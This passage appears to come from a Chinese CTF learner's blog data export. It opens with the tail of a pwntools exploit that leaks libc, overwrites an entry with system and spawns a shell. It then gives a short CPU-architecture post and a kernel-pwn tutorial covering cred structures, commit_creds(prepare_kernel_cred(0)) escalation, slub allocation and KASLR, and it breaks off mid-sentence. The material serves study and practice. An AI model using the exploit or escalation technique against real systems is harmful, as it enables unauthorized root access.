class=\"string\">&#x27;\\x7f&#x27;</span>))-offset</span><br><span class=\"line\">leak(<span class=\"string\">&quot;libcbase&quot;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#get shell</span></span><br><span class=\"line\">sys_addr=libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">leak(<span class=\"string\">&quot;system&quot;</span>,<span class=\"built_in\">hex</span>(sys_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">payload=p64(sys_addr)</span><br><span class=\"line\">debug(<span class=\"string\">&#x27;b *0x400b29&#x27;</span>)</span><br><span class=\"line\">edit(-<span class=\"number\">12</span>,payload[:-<span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&#x27;&gt;&gt; &#x27;</span>)</span><br><span class=\"line\">sl(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&quot;Index:&quot;</span>)</span><br><span class=\"line\">s(<span class=\"string\">&quot;/bin/sh\\x00&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>"},{"title":"Linux_Basic","date":"2023-03-14T13:11:50.000Z","_content":"\n学到后面感觉linux相关知识有不少的欠缺，现在补充学习下Linux的知识。\n\n<!--more-->\n\n计算机是一种工具，用于接收用户输入的命令与数据，经中央处理器的算术逻辑单元运算处理后，产生或存储成有用的信息，其可分为三部分：输入单元、输出单元、主机部分。\n\n输入单元和输出单元就是`I/O`，负责与用户的交互，接收用户的输入并向用户输出信息。\n\n主机部分中包含CPU、内存、硬盘存储卡等信息，其中最重要的就是CPU。CPU是一块具有特定功能的芯片，里面含有指令集，其工作主要在于管理和运算，分为算术逻辑单元和控制单元。\n\nCPU指令集的设计理念有所不同，由此引出目前最常见的两种CPU架构：精简指令集(RISC)和复杂指令集(CISC)。\n\n- 精简指令集(RISC)\n\n    指令集较为精简，每个指令运行时间短，完成的操作简单，性能较佳，但复杂的工作需要多个指令完成。ARM架构就采用了RISC。\n\n- 复杂指令集(CISC)\n\n    指令集多而复杂，每个指令运行时间长，可处理的工作比较丰富，指令多且复杂，指令长度不尽相同。AMD、Intel等x86架构就采用了CISC。\n\n# Linux主机规划\n\n","source":"_posts/Linux-Basic.md","raw":"---\ntitle: Linux_Basic\ndate: 2023-03-14 21:11:50\ntags:\n- linux\ncategories:\n- linux\n---\n\n学到后面感觉linux相关知识有不少的欠缺，现在补充学习下Linux的知识。\n\n<!--more-->\n\n计算机是一种工具，用于接收用户输入的命令与数据，经中央处理器的算术逻辑单元运算处理后，产生或存储成有用的信息，其可分为三部分：输入单元、输出单元、主机部分。\n\n输入单元和输出单元就是`I/O`，负责与用户的交互，接收用户的输入并向用户输出信息。\n\n主机部分中包含CPU、内存、硬盘存储卡等信息，其中最重要的就是CPU。CPU是一块具有特定功能的芯片，里面含有指令集，其工作主要在于管理和运算，分为算术逻辑单元和控制单元。\n\nCPU指令集的设计理念有所不同，由此引出目前最常见的两种CPU架构：精简指令集(RISC)和复杂指令集(CISC)。\n\n- 精简指令集(RISC)\n\n    指令集较为精简，每个指令运行时间短，完成的操作简单，性能较佳，但复杂的工作需要多个指令完成。ARM架构就采用了RISC。\n\n- 复杂指令集(CISC)\n\n    指令集多而复杂，每个指令运行时间长，可处理的工作比较丰富，指令多且复杂，指令长度不尽相同。AMD、Intel等x86架构就采用了CISC。\n\n# Linux主机规划\n\n","slug":"Linux-Basic","published":1,"updated":"2023-03-19T11:44:36.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czaf9000w5oud6xamb5zf","content":"<p>学到后面感觉linux相关知识有不少的欠缺，现在补充学习下Linux的知识。</p>\n<span id=\"more\"></span>\n\n<p>计算机是一种工具，用于接收用户输入的命令与数据，经中央处理器的算术逻辑单元运算处理后，产生或存储成有用的信息，其可分为三部分：输入单元、输出单元、主机部分。</p>\n<p>输入单元和输出单元就是<code>I/O</code>，负责与用户的交互，接收用户的输入并向用户输出信息。</p>\n<p>主机部分中包含CPU、内存、硬盘存储卡等信息，其中最重要的就是CPU。CPU是一块具有特定功能的芯片，里面含有指令集，其工作主要在于管理和运算，分为算术逻辑单元和控制单元。</p>\n<p>CPU指令集的设计理念有所不同，由此引出目前最常见的两种CPU架构：精简指令集(RISC)和复杂指令集(CISC)。</p>\n<ul>\n<li><p>精简指令集(RISC)</p>\n<p>  指令集较为精简，每个指令运行时间短，完成的操作简单，性能较佳，但复杂的工作需要多个指令完成。ARM架构就采用了RISC。</p>\n</li>\n<li><p>复杂指令集(CISC)</p>\n<p>  指令集多而复杂，每个指令运行时间长，可处理的工作比较丰富，指令多且复杂，指令长度不尽相同。AMD、Intel等x86架构就采用了CISC。</p>\n</li>\n</ul>\n<h1 id=\"Linux主机规划\"><a href=\"#Linux主机规划\" class=\"headerlink\" title=\"Linux主机规划\"></a>Linux主机规划</h1>","site":{"data":{}},"excerpt":"<p>学到后面感觉linux相关知识有不少的欠缺，现在补充学习下Linux的知识。</p>","more":"<p>计算机是一种工具，用于接收用户输入的命令与数据，经中央处理器的算术逻辑单元运算处理后，产生或存储成有用的信息，其可分为三部分：输入单元、输出单元、主机部分。</p>\n<p>输入单元和输出单元就是<code>I/O</code>，负责与用户的交互，接收用户的输入并向用户输出信息。</p>\n<p>主机部分中包含CPU、内存、硬盘存储卡等信息，其中最重要的就是CPU。CPU是一块具有特定功能的芯片，里面含有指令集，其工作主要在于管理和运算，分为算术逻辑单元和控制单元。</p>\n<p>CPU指令集的设计理念有所不同，由此引出目前最常见的两种CPU架构：精简指令集(RISC)和复杂指令集(CISC)。</p>\n<ul>\n<li><p>精简指令集(RISC)</p>\n<p>  指令集较为精简，每个指令运行时间短，完成的操作简单，性能较佳，但复杂的工作需要多个指令完成。ARM架构就采用了RISC。</p>\n</li>\n<li><p>复杂指令集(CISC)</p>\n<p>  指令集多而复杂，每个指令运行时间长，可处理的工作比较丰富，指令多且复杂，指令长度不尽相同。AMD、Intel等x86架构就采用了CISC。</p>\n</li>\n</ul>\n<h1 id=\"Linux主机规划\"><a href=\"#Linux主机规划\" class=\"headerlink\" title=\"Linux主机规划\"></a>Linux主机规划</h1>"},{"title":"Kernel Basic Knowledge","date":"2023-01-01T16:01:40.000Z","_content":"\n开始学习kernel pwn，在用户态pwn中，我们需要利用用户态程序的漏洞，劫持该程序的执行流，从该程序中起一个`shell`，或者走`orw`获得`flag`。kernel pwn中类似，我们需要利用内核的漏洞，劫持程序流使其能够提权到`root`或者使其能泄露敏感信息`flag`。\n\n**kernel pwn和用户态pwn在本质上并没有区别**，利用思路都是相似的，只是细节上会有所差别。一般来说，kernel pwn也不会让我们找内核中的漏洞，而是给出一个有问题的`LKM`让我们分析。\n\n<!--more-->\n\n## Kernel\n\nkernel也就是内核，是操作系统的核心部分，用来管理软件发出的数据 I/O 要求，将这些要求转义为指令，交给 CPU 和计算机中的其他组件处理。kernel处在应用程序和硬件之间，向上对应用程序提供硬件的使用接口，向下按照应用程序的要求与硬件进行交互。\n\n![image-20230115125518678](./Kernel_Basic_Knowledge/image-20230115125518678.png)\n\n但无论是应用程序还是操作系统，他们始终都是**程序**，他们**都是在物理地址上运行的代码和数据**，他们之间的区别主要在于**权限**。操作系统能够使用**所有的指令**，这使**内核态代码能完全使用所有硬件**，而应用程序只能使用**一部分指令**，这导致**用户态代码只能部分使用硬件**。\n\n需要注意的是，**kernel 的 crash 通常会引起重启**。\n\n### 内核架构\n\n通常来说我们可以把内核架构分为两种：`宏内核`和`微内核`，现在还有一种内核是混合了宏内核与微内核的特性，称为 `混合内核` ，宏内核和微内核的区别如下：\n\n- 宏内核：此架构的特性是**整个内核程序是一个单一二进制可执行文件**，**几乎所有功能都被集成进内核**。在内核态以监管者模式（Supervisor Mode）来运行在一个单独的地址空间**，所有的内核服务都在一个地址空间运行，相互之间直接调用函数**，简单高效。宏内核会定义出一个高端的虚拟接口，由该接口来涵盖描述整个电脑硬件，这些描述会集合成一组硬件描述用词，有时还会附加一些系统调用，如此可以用一个或多个模块来实现各种操作系统服务。\n- 微内核：内核中只有最基本的调度、内存管理。驱动、文件系统等都是用户态的守护进程去实现的，**微内核中功能被划分成独立的过程**，**过程间通过IPC进行通信**。模块化程度高，一个服务失效不会影响另外一个服务。\n\n**Linux Kernel采用的是宏内核**。\n\n## **hierarchical protection domains**（分级保护域）\n\nintel CPU将权限划分为`Ring0、Ring1、Ring2、Ring3`四个等级，就像这四个等级的名字一样，四个等级构成四个环。\n\n越里面的环的权限越高，使用硬件的能力越强，其中`Ring0`表示最高权限，`Ring3`表示最低权限。通过这种方式对计算机的资源进行分级，实现权限的管理。\n\n![image-20230115130938230](./Kernel_Basic_Knowledge/image-20230115130938230.png)\n\n`Ring0`拥有最高特权，并且可以和最多的硬件直接交互（比如CPU，内存），因此**操作系统内核代码通常运行在 `Ring0` 下，即 CPU 在执行操作系统内核代码时处在`Ring0` 下**。\n\n应用程序代码通常处在`Ring3`，拥有的权限最低，即 **CPU 在执行用户进程代码时处在 ring3 下**。\n\n那么什么是用户态，什么是内核态呢？\n\n- 用户态：CPU 运行在 `Ring3` + 用户进程运行环境上下文\n- 内核态：CPU 运行在 `Ring0` + 内核代码运行环境上下文\n\n## 状态切换\n\n当发生**系统调用(syscall,int 0x80)，产生异常，外设产生中断**等事件时，会发生**用户态到内核态**的切换，具体的过程为：\n\n1. 通过 `swapgs` 切换`GS`段寄存器，将 `GS` 寄存器值**和一个特定位置的值进行交换**，目的是保存`GS`值，同时将该位置的值**作为内核执行时的`GS`值**使用。\n2. 将当前栈顶（用户空间栈顶）记录在 **CPU 独占变量区域**里，将 CPU 独占区域里记录的**内核栈顶**放入 `rsp/esp`。\n3. 通过 push 保存各寄存器值:\n\n```c\n ENTRY(entry_SYSCALL_64)\n /* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */\n SWAPGS_UNSAFE_STACK\n\n /* 保存栈值，并设置内核栈 */\n movq %rsp, PER_CPU_VAR(rsp_scratch)\n movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp\n\n\n/* 通过push保存寄存器值，形成一个pt_regs结构 */\n/* Construct struct pt_regs on stack */\npushq  $__USER_DS      /* pt_regs->ss */\npushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs->sp */\npushq  %r11             /* pt_regs->flags */\npushq  $__USER_CS      /* pt_regs->cs */\npushq  %rcx             /* pt_regs->ip */\npushq  %rax             /* pt_regs->orig_ax */\npushq  %rdi             /* pt_regs->di */\npushq  %rsi             /* pt_regs->si */\npushq  %rdx             /* pt_regs->dx */\npushq  %rcx tuichu    /* pt_regs->cx */\npushq  $-ENOSYS        /* pt_regs->ax */\npushq  %r8              /* pt_regs->r8 */\npushq  %r9              /* pt_regs->r9 */\npushq  %r10             /* pt_regs->r10 */\npushq  %r11             /* pt_regs->r11 */\nsub $(6*8), %rsp      /* pt_regs->bp, bx, r12-15 not saved */\n```\n\n4. 通过汇编指令判断是否为 `x32_abi`（表示是否为32位系统）。\n5. 通过**系统调用号**，跳到全局变量 `sys_call_table` 相应位置继续执行系统调用。\n\n当在内核态中的工作执行完时，会从**内核态返回用户态**，过程如下：\n\n1. 通过 `swapgs` 恢复`GS`值\n2. 通过 `sysretq` 或者 `iretq` 恢复到用户控件继续执行。如果使用 `iretq` 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）\n\n## 系统调用\n\n系统调用提供用户程序与操作系统间的接口，部分库函数（如 scanf，puts 等 IO 相关的函数实际上是对系统调用的封装（read 和 write））。当用户空间的程序利用现有权限无法满足需求时，就会进行系统调用向操作系统内核请求需要更高权限的服务。在这个过程中，用户进程会**暂时陷入内核态，待内核工作完成后再返回用户态**。\n\n64位和32位的系统调用号分别存放在 `/usr/include/x86_64-linux-gnu/asm/unistd_64.h` 和 `/usr/include/x86_64-linux-gnu/asm/unistd_32.h` 。\n\n根据系统位数不同，Linux 下系统调用的方式也不同：\n\n- 32位：执行 `int 0x80 `汇编指令（80号中断）\n- 64位：执行 `syscall` 汇编指令 / 执行 `sysenter` 汇编指令（only intel）\n\n用户态进入到内核态的流程如下：\n\n通过`eax/rax`寄存器存放**系统调用号**，并通过寄存器存放该系统调用的参数：\n\n- 32 位：`ebx、ecx、edx、esi、edi、ebp`作为第一个参数、第二个参数…进行参数传递\n- 64 位：`rdi、rsi、rdx、rcx、r8、r9`作为第一个参数、第二个参数…进行参数传递\n\n同样地，内核执行完系统调用后退出系统调用也有对应的两种方式：\n\n- 执行`iret`汇编指令\n- 执行 `sysret` 汇编指令 / 执行`sysexit`汇编指令（only Intel）\n\n## 进程权限管理\n\nkernel调度所有计算机资源，并为应用程序提供他们的抽象，相应的，应用程序的权限也由kernel来管理，kernel决定一个应用程序是否有权限使用某一抽象。\n\n在内核中使用结构体 `task_struct` 表示一个进程，该结构体定义于内核源码`include/linux/sched.h`中，其中的内容大致如下：\n\n![img](./Kernel_Basic_Knowledge/2W8xIfwqm9Y7Fru.png)\n\n### 结构体cred\n\n在结构体`task struct`中就包含有权限的信息，**Process credentials** 就是 kernel 用以判断一个进程权限的凭证，在 kernel 中使用 `cred` 结构体进行标识，对于一个进程而言应当有三个 cred：\n\n- **ptracer_cred：**使用`ptrace`系统调用跟踪该进程的上级进程的cred（gdb调试便是使用了这个系统调用，常见的反调试机制的原理便是提前占用了这个位置）\n- **real_cred：**即**客体凭证**（**objective cred**），通常是一个进程最初启动时所具有的权限\n- **cred：**即**主体凭证**（**subjective cred**），该进程的有效cred，kernel以此作为进程权限的凭证\n\n一般情况下，主体凭证与客体凭证的值是相同的\n\n```c\n/* Process credentials: */\n\n/* Tracer's credentials at attach: */\nconst struct cred __rcu        *ptracer_cred; //gdb调试使用该cred\n\n/* Objective and real subjective task credentials (COW): */\nconst struct cred __rcu        *real_cred; //进程最初的权限\n\n/* Effective (overridable) subjective task credentials (COW): */\nconst struct cred __rcu        *cred; //进程当前的权限\n```\n\n结构体`cred`定义于内核源码`include/linux/cred.h`中，用于表示权限凭证：\n\n```c\nstruct cred {\n    atomic_t    usage;\n#ifdef CONFIG_DEBUG_CREDENTIALS\n    atomic_t    subscribers;    /* number of processes subscribed */\n    void        *put_addr;\n    unsigned    magic; //可用于寻找cred结构体\n#define CRED_MAGIC    0x43736564\n#define CRED_MAGIC_DEAD    0x44656144\n#endif\n    //各种ID\n    kuid_t        uid;        /* real UID of the task */ \n    kgid_t        gid;        /* real GID of the task */\n    kuid_t        suid;        /* saved UID of the task */\n    kgid_t        sgid;        /* saved GID of the task */\n    kuid_t        euid;        /* effective UID of the task */\n    kgid_t        egid;        /* effective GID of the task */\n    kuid_t        fsuid;        /* UID for VFS ops */\n    kgid_t        fsgid;        /* GID for VFS ops */\n    \n    unsigned    securebits;    /* SUID-less security management */\n    kernel_cap_t    cap_inheritable; /* caps our children can inherit */\n    kernel_cap_t    cap_permitted;    /* caps we're permitted */\n    kernel_cap_t    cap_effective;    /* caps we can actually use */\n    kernel_cap_t    cap_bset;    /* capability bounding set */\n    kernel_cap_t    cap_ambient;    /* Ambient capability set */\n#ifdef CONFIG_KEYS\n    unsigned char    jit_keyring;    /* default keyring to attach requested\n                     * keys to */\n    struct key    *session_keyring; /* keyring inherited over fork */\n    struct key    *process_keyring; /* keyring private to this process */\n    struct key    *thread_keyring; /* keyring private to this thread */\n    struct key    *request_key_auth; /* assumed request_key authority */\n#endif\n#ifdef CONFIG_SECURITY\n    void        *security;    /* subjective LSM security */\n#endif\n    struct user_struct *user;    /* real user ID subscription */\n    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */\n    struct group_info *group_info;    /* supplementary groups for euid/fsgid */\n    /* RCU deletion */\n    union {\n        int non_rcu;            /* Can we skip RCU deletion? */\n        struct rcu_head    rcu;        /* RCU deletion hook */\n    };\n} __randomize_layout;\n```\n\n`cred`结构体中记录了**一个进程四种不同种类的UID（用户ID）和GID（组ID）**：\n\n- **真实ID**（real ID）：标识一个进程**启动时的ID**\n- **保存ID**（saved ID）：标识一个进程**最初的有效ID**\n- **有效ID**（effective ID）：标识一个进程**正在运行时所属的ID**，一个进程在运行途中是可以改变自己所属用户和组的，因而权限机制也是**通过有效ID进行认证**的，内核通过有效ID来进行特权判断；为了防止用户一直使用高权限，**当任务完成之后，有效ID会与保存ID进行交换**，恢复进程的有效权限\n- **文件系统ID**（ID for VFS ops）：标识一个进程**创建文件时进行标识的ID**\n\n通常情况下这几个ID都是相同的。\n\n### 提权\n\n一个进程的权限是由位于内核空间的`cred`结构体进行管理的，因此只要改变一个进程的`cred`结构体，就能改变其执行权限，在内核空间有如下两个函数，都位于`kernel/cred.c`中，可以用于改变`cred`结构体：\n\n- `struct cred* prepare_kernel_cred(struct task_struct* daemon)`：该函数用以拷贝一个进程的cred结构体，并返回一个新的cred结构体，需要注意的是`daemon`参数应为**有效的进程描述符地址或NULL**\n- `int commit_creds(struct cred *new)`：该函数用以将一个新的`cred`结构体应用到进程\n\n在`prepare_kernel_cred()`函数中，若传入的参数为NULL，则会缺省使用`init`进程的`cred`作为模板进行拷贝，**即可以直接获得一个标识着root权限的cred结构体**\n\n那么我们不难想到，只要我们能够**在内核空间执行`commit_creds(prepare_kernel_cred(NULL))`**，那么就能够将当前进程的权限提升到`root`\n\n## 文件\n\nLinux系统的设计中秉承着**万物皆文件**的思想，因此**所有计算机资源都被抽象为文件**，无论是硬件设备、目录、普通文件、管道，甚至进程、磁盘都被抽象成文件。基于这种设计，**所有计算机资源都可以通过访问文件的形式进行操作，所有读操作都可以使用`read`完成，所有写操作都可以使用`write`完成**，所有操作最后都可以以读写的方式实现。\n\n### 进程文件系统\n\n我们知道Linux系统中的进程也被抽象成了文件，那就代表它的数据以文件的形式存放，并且我们可以通过访问文件的形式对其进行读写。\n\n进程文件系统（process file system， 简写为procfs）用以描述一个进程，其中包括该进程所打开的文件描述符、堆栈内存布局、环境变量等等。它本身是一个伪文件系统，通常被挂载到`/proc`目录下，并不真正占用储存空间，而是占用一定的**内存**。当一个进程被建立起来时，其进程文件系统便会被**挂载到`/proc/[PID]`**下，我们可以在该目录下查看其相关信息。\n\n### 文件的访问\n\n进程通过**文件描述符**（**file descriptor**）来完成对文件的访问，文件描述符是一个非负整数，本质上是对文件的索引值，进程所有执行 I/O 操作的系统调用都会通过文件描述符来找到对应文件。\n\n每个进程都**独立有着一个文件描述符表**，存放着该进程所打开的文件索引，每当进程**成功**打开一个现有文件/创建一个新文件时（通过系统调用open进行操作），**内核会向进程返回一个文件描述符**。在kernel中有着一个文件表，由所有的进程**共享**。\n\n详细可以回看`IO_FILE`部分。\n\n### iotcl\n\n操作系统向应用程序提供了系统调用，使应用程序可以**通过内核访问标准外部设备**，因为大多数硬件设备只能够在内核空间内直接寻址。\n\n但是当访问**非标准**硬件设备时，使用系统调用显得不合适， 因为部分设备可能没有被内核考虑到，这样应用程序就无法使用该设备了，这时候就需要用户模式直接访问设备。\n\n为了解决这个问题，内核被设计成**可扩展**的，可以加入一个称为**设备驱动**的模块，**驱动的代码允许在内核空间运行而且可以对设备直接寻址**。并且预留了一个**系统调用`iotcl`用于用户空间和设备驱动的通信**。\n\n对设备驱动的请求是一个**以设备和请求号码为参数**的`ioctl`调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用。\n\n```c\nint ioctl(int fd, unsigned long request, ...)\n```\n\n- **fd：设备的文件描述符**\n- **request：请求码**\n- **其他参数**\n\n## Loadable Kernel Modules(LKMs)\n\nLinux Kernel采用宏内核架构，一切的系统服务都需要由内核来提供，虽然效率较高，但是**缺乏可扩展性与可维护性**。同时内核需要装载很多可能用到的服务，但这些服务最终可能未必会用到，还会**占据大量内存空间**，如果要加入的新服务往往意味着要**重新编译整个内核**。\n\n**可加载内核模块（Loadable Kernel Modules，即LKMs）**的设计就是为了解决上述问题。在内核空间运行的LKMs可以为应用程序提供**新的系统调用或服务**，同时LKMs可以像积木一样从内核中被**装载/卸载**，大大提高了kernel的可拓展性与可维护性\n\n可加载内核模块 (或直接称为内核模块) 就像运行在内核空间的可执行程序，包括:\n\n- 驱动程序（Device drivers）\n    - 设备驱动\n    - 文件系统驱动\n    - ...\n- 内核扩展模块 (modules)\n\nLKMs与用户态可执行文件一样都**采用ELF格式**，但是**LKMs运行在内核空间，且无法脱离内核运行**\n\n通常与LKM相关的命令有以下三个：\n\n- `lsmod`：列出现有的LKMs\n- `insmod`：装载新的LKM（需要root）\n- `rmmod`：从内核中移除LKM（需要root）\n- `modprobe`: 添加或删除模块，modprobe 在加载模块时会查找依赖关系\n\n> 大多数CTF比赛中，kernel pwn的漏洞出现在 LKM 中。\n\n## 内核内存管理\n\nLinux kernel 将内存分为 `页→区→节点` 三级结构，主要有两个内存管理器—— `buddy system` 与 `slab allocator`。内存结构**自顶向下**依次为：\n\n- 节点(node)\n- 区(zone)\n- 页(page)\n\n### 内核内存结构\n\n页：Linux kernel 中使用 `page` 结构体来表示一个物理页框，**每个物理页框都有着一个对应的 page 结构体**。\n\n![image.png](./Kernel_Basic_Knowledge/MjWZmba9SLH1xIO.png)\n\n\n\n区：在 Linux 下将一个节点内**不同用途**的内存区域划分为不同的 `区（zone）`，对应结构体 `struct zone`。\n\n![偷的图.png](./Kernel_Basic_Knowledge/sOwdI5YMNUjLSib.png)\n\n节点：zone 再向上一层便是**节点**——Linux 将**内存控制器（memory controller）**作为节点划分的依据。\n\n### 内存模型\n\nLinux 提供了三种内存模型，定义于 `include/asm-generic/memory_model.h` 中。\n\n![image.png](./Kernel_Basic_Knowledge/wLzFuCB5n1DAIY7.png)\n\n内存模型在编译期就会被确定下来，目前常用的是 `Sparse Memory` 模型，即离散内存模型。\n\n#### Flat Memory\n\n平滑内存模型。物理内存地址连续，有一个**全局变量** `mem_map` ，通过一个大的 `struct page` 数组直接对应现有的物理内存。\n\n#### Discontiguous Memory\n\n非连续性内存模型。主要针对内存中存在空洞的情况。\n\n对于**每一段连续的物理内存**，都有一个 `pglist_data` 结构体进行对应，其成员 `node_mem_map` 为一个 `struct page` 指针，指向一个 page 结构体数组，由该结构体对应到该段连续物理内存。\n\n有一个**全局变量** `node_data` 为一个 `pglist_data` 指针数组，其中存放着指向每一个 `pglist_data` 的指针，该数组的大小为 `MAX_NUMNODES`。\n\n#### Sparse Memory\n\n离散内存模型。在一个 `mem_section` 结构体中存在一个 `section_mem_map` 成员指向一个 `struct page` 数组对应一段连续的物理内存，即**将内存按照 `section` 为单位**进行分段。\n\n存在一个全局指针数组 `mem_section` （与结构体同名）存放所有的 `mem_section` 指针，指向**理论上支持的内存空间**，每个 `section` **对应的物理内存不一定存在**，若不存在则此时该 section 的指针为 NULL。\n\n这种模型**支持内存的热拔插**。\n\n### buddy system\n\n`buddy system` 是 Linux kernel 中的一个较为底层的内存管理系统，**以内存页为粒度管理所有的物理内存**，其存在于 **区** 这一级别，对当前区所对应拥有的所有物理页框进行管理\n\n在每个 zone 结构体中都有一个 `free_area` 结构体数组，用以存储 buddy system **按照 order 管理的页面**\n\n```c\nstruct zone {\n    //...\n    struct free_area\tfree_area[MAX_ORDER];\n    //...\n```\n\n`MAX_ORDER`为一个常量，其值为`11`。\n\n在 buddy system 中**按照空闲页面的连续大小**进行**分阶**管理，这里的 order 的实际含义为**连续的空闲页面的大小**，不过单位不是页面数，而是`阶`，即对于每个下标而言，其中所存储的页面大小为：$2^{order}$。\n\n`free_area`中的页面通过自身的相应字段形成**双向链表**结构：\n\n![偷的图.png](./Kernel_Basic_Knowledge/sOwdI5YMNUjLSib-1678172668801-7.png)\n\n- 分配：\n    - 首先会将请求的内存大小向 2 的幂次方张内存页大小**对齐**，之后从**对应的下标**取出连续内存页\n    - 若对应下标链表为**空**，则会从**下一个 order** 中取出内存页，**一分为二**，装载到当前下标对应链表中，之后再返还给上层调用，若下一个 order 也为空则会继续向**更高**的 order 进行该请求过程\n- 释放：\n    - 将对应的连续内存页释放到对应的链表上\n    - 检索**是否有可以合并**的内存页，若有，则进行合成，放入**更高** order 的链表中\n\n但是我们很容易产生**不容易合并**的内存碎片，因此 Linux kernel 还会进行 **内存迁移** 以减少内存碎片，主要由一个持续运行的内核线程完成。\n\n### slab allocator\n\nslab allocator 则是**更为细粒度的内存管理器**，其通过向 buddy system 请求**单张或多张连续内存页**后再分割成**同等大小**的**对象**（object）返还给上层调用者来实现更为细粒度的内存管理\n\nslab allocator 一共有三种版本：\n\n- slab（最初的版本，机制比较复杂，效率不高）\n- slob（用于嵌入式等场景的极为简化版本）\n- slub（优化后的版本，现在的通用版本）\n\n#### 基本结构\n\nslub allocator的基本结构如下：\n\n![image.png](./Kernel_Basic_Knowledge/ivPnbsjHyI94m5z.png)\n\nslub allocator每次向buddy system请求得到的单**张/多张的内存页称为一个`slub`**，这个`slub`会被分为多个**同样大小**的对象(object)，每个object作为一个被分配的实体。在 `slub` 的**第一张内存页**对应的 page 结构体上的 `freelist` 成员指向该张内存页上的**第一个空闲对象**，一个 `slub` 上的**所有空闲对象**组成一个以 `NULL` 结尾的**单向**链表。\n\n> object类似于堆中的chunk，不过由于page结构体与物理地址之间有线性对应关系，可以直接通过object地址找到对应的page结构体，因此不需要header\n\n`kmem_cache`是allocator一个**分配组件**，用于**分配特定大小（特定用途）**的对象，所有的`kmem_cache`构成一个**双向**链表。存在两个结构体数组`kmalloc_caches`和`kmalloc_dma_caches`对`kmem_cache`进行管理。\n\n一个`kmem_cache`主要由`kmem_cache_cpu`和`kmem_cache_node`组成。\n\n- `kmem_cache_cpu`：这是一个**percpu 变量**（即每个核心上都独立保留有一个副本，原理是以` gs` 寄存器作为 `percpu` 段的基址进行寻址），用以表示**当前核心正在使用的 `slub`**，因此当前 CPU 在从 kmem_cache_cpu 上取 object 时**不需要加锁**，从而极大地提高了性能\n- kmem_cache_node：可以理解为当前kmem_cache的 slub 集散中心，其中存放着**两个 slub 链表**：\n    - partial：该 slub 上**存在**着一定数量的**空闲** object，但并非全部空闲\n    - full：该 slub 上的**所有** object 都被**分配**出去了\n\n#### 分配和释放\n\n- 分配：\n    - 首先从 `kmem_cache_cpu` 上取对象，若有则直接返回\n    - 若 `kmem_cache_cpu` 上的 slub 已经无空闲对象了，对应 slub 会被加入到 `kmem_cache_node` 的 **full** 链表，并尝试从 **partial** 链表上取一个 slub 挂载到 `kmem_cache_cpu` 上，然后再取出空闲对象返回\n    - 若 `kmem_cache_node` 的 partial 链表也空了，那就**向 buddy system 请求分配新的内存页**，划分为多个 object 之后再给到 `kmem_cache_cpu`，取空闲对象返回上层调用\n- 释放：\n    - 若被释放 object 属于 `kmem_cache_cpu` 的 slub，直接使用头插法插入当前 CPU slub 的 freelist\n    - 若被释放 object 属于 `kmem_cache_node` 的 partial 链表上的 slub，直接使用头插法插入对应 slub 的 freelist\n    - 若被释放 object 属于 `kmem_cache_node` 的 full 链表上的 slub，则其会成为对应 slub 的 freelist 头节点，**且该 slub 会从 full 链表迁移到 partial 链表**\n\n#### slab alias\n\nslab alias 机制是一种对**同等/相近大小** object 的 `kmem_cache` 进行**复用**的一种机制：\n\n当一个 `kmem_cache` 在创建时，若已经存在能分配**相等/近似**大小的 object 的 `kmem_cache` ，则**不会创建新的 kmem_cache，而是为原有的 kmem_cache 起一个 alias，作为“新的” kmem_cache 返回**\n\n对于初始化时设置了 `SLAB_ACCOUNT` 这一 flag 的 `kmem_cache` 而言，则会**新建**一个新的 `kmem_cache` 而非为原有的建立 alias。\n\n如：在 Linux 4.4 之前的版本中，`cred_jar` 是 `kmalloc-192`的`alias`，在此之后的版本中，由于设置了`SLAB_ACCOUNT` 标志`cred_jar` 和 `kmalloc-192`是两个独立的 `kmem_cache`。（`cred_jar`是专门用于分配`cred`结构体的`kmem_cache`）\n\n## 内核态函数\n\n内核态的函数有些变化：\n\n- printf() -> **printk()**，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在**内核缓冲区**里，可以通过 `dmesg` 查看效果\n- memcpy() ->copy_from_user()/copy_to_user()\n    - `unsigned long copy_from_user(void *to, const void __user *from, unsigned long n)`实现了将用户空间的数据传送到内核空间\n    - `unsigned long copy_to_user (void __user * to, const void * from, unsigned long n) `实现了将内核空间的数据传送到用户空间\n- malloc() -> **kmalloc()**，内核态的内存分配函数，和 malloc() 相似，但使用的是 `slab/slub 分配器`\n- free() -> **kfree()**，同 kmalloc()\n\n用于改变权限的函数：\n\n- `struct cred* prepare_kernel_cred(struct task_struct* daemon)`：该函数用以拷贝一个进程的cred结构体，并返回一个新的cred结构体，需要注意的是`daemon`参数应为**有效的进程描述符地址或NULL**\n- `int commit_creds(struct cred *new)`：该函数用以将一个新的`cred`结构体应用到进程\n\n从函数名也可以看出，执行 `commit_creds(prepare_kernel_cred(0))` 即可获得 root 权限，0 表示 以 0 号进程作为参考准备新的 credentials。\n\n## 内核态保护机制\n\n与用户态类似，内核态也有对应的保护机制，canary, dep, PIE, RELRO 等保护与用户态原理和作用相同，除此之外，内核还有特殊的保护机制。\n\n### KASLR\n\nKASLR即`内核空间地址随机化`（kernel address space layout randomize），与用户态程序的ASLR相类似，在内核镜像映射到实际的地址空间时加上一个随机的偏移值，但是内核内部的**相对偏移**其实还是不变的\n\n### FGKASLR\n\nKASLR 虽然在一定程度上能够缓解攻击，但是若是攻击者通过一些信息泄露漏洞获取到内核中的某个地址，仍能够直接得知内核加载地址偏移从而得知整个内核地址布局，这在用户态pwn中也已经见怪不怪了。\n\n因此有研究者基于 KASLR 实现了 FGKASLR，**以函数粒度重新排布内核代码**，将每个函数单独分段，每个段的偏移随机化，这会大大提高攻击的难度。目前，FGKASLR 